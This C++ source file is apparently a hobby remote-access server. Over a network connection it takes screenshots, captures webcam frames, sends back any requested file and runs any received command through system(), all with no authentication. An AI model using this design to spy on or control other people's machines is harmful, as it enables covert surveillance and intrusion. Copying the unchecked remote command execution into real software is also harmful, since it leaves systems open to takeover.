// basic text server.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include "../WinNetlib/NetworkHandlerServer.h"
#include <thread>

#include <opencv2/opencv.hpp>

using namespace std;

std::string windowName = "pic"; //Name of the window

cv::Mat hwnd2mat(HWND hwnd) {

    HDC hwindowDC, hwindowCompatibleDC;

    int height, width, srcheight, srcwidth;
    HBITMAP hbwindow;
    cv::Mat src;
    BITMAPINFOHEADER  bi;

    hwindowDC = GetDC(hwnd);
    hwindowCompatibleDC = CreateCompatibleDC(hwindowDC);
    SetStretchBltMode(hwindowCompatibleDC, COLORONCOLOR);

    RECT windowsize;    // get the height and width of the screen
    GetClientRect(hwnd, &windowsize);

    srcheight = windowsize.bottom;
    srcwidth = windowsize.right;
    height = windowsize.bottom;  //change this to whatever size you want to resize to
    width = windowsize.right;

    src.create(height, width, CV_8UC4);

    // create a bitmap
    hbwindow = CreateCompatibleBitmap(hwindowDC, width, height);
    bi.biSize = sizeof(BITMAPINFOHEADER);    //http://msdn.microsoft.com/en-us/library/windows/window/dd183402%28v=vs.85%29.aspx
    bi.biWidth = width;
    bi.biHeight = -height;  //this is the line that makes it draw upside down or not
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    // use the previously created device context with the bitmap
    SelectObject(hwindowCompatibleDC, hbwindow);
    // copy from the window device context to the bitmap device context
    StretchBlt(hwindowCompatibleDC, 0, 0, width, height, hwindowDC, 0, 0, srcwidth, srcheight, SRCCOPY); //change SRCCOPY to NOTSRCCOPY for wacky colors !
    GetDIBits(hwindowCompatibleDC, hbwindow, 0, height, src.data, (BITMAPINFO*)&bi, DIB_RGB_COLORS);  //copy from hwindowCompatibleDC to hbwindow

    // avoid memory leak
    DeleteObject(hbwindow); DeleteDC(hwindowCompatibleDC); ReleaseDC(hwnd, hwindowDC);

    return src;
}

void rcv(NetworkHandlerServer NH) {
    cv::VideoCapture cap(0);
    HWND hDesktopWnd = GetDesktopWindow();
    DataType dt;
    while (true) {
        NH.RecvDataType(dt);
        if (dt.Name == "DesktopIMG")
        {
            cv::Mat frame = hwnd2mat(hDesktopWnd);
            NH.SendCVMat(frame);
        }
        else if (dt.Name == "DesktopCLICK") {
            int x = NH.RecvDataT<int>();
            int y = NH.RecvDataT<int>();
            int clickType = NH.RecvDataT<int>();
            //sim click

        }
        else if (dt.Name == "CamIMG") {
            cv::Mat frame;
            cap.read(frame);
            NH.SendCVMat(frame);
        }
        else if (dt.Name == "FILE") {
            string path = NH.RecvDataT<string>();
            NH.SendFile(path,100000);
        }
        else if (dt.Name == "CMD") {
            string command = NH.RecvDataT<std::string>();
            system(command.c_str());
        }
        else if (dt.Name == "DataTypeList") {
            NH.RecvTypeList();
        }

    }

}


int main()
{
    NetworkHandlerServer NH;

    thread recvThread;


    if (NH.DefaultInitConnect()) {
        recvThread = thread(rcv, NH);

        system("pause");
    }

    recvThread.join();
    return 0;
}